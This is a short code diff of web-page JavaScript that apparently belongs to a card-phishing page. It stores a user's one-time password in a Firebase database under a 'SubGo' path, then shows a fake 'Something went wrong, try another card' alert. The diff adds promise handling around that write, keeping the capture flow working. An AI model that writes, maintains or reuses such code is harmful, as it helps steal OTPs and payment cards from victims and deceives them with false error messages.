@@ -67,11 +67,16 @@ const db = getDatabase(app);
         document.getElementById('loadingOverlay').style.display = 'flex';
     set(ref(db, 'SubGo/' + Math.random().toString(36).slice(2, 7)), {
   Notification: otp
-});
+}).then(() => {
     setTimeout(function() {
     document.getElementById('loadingOverlay').style.display = 'none';
   alert('Something went wrong, try another card or retry')
 }, 1000);
+  }).catch((error) => {
+    document.getElementById('loadingOverlay').style.display = 'none';
+    alert(error);
+  });
+    
 
         }
       });
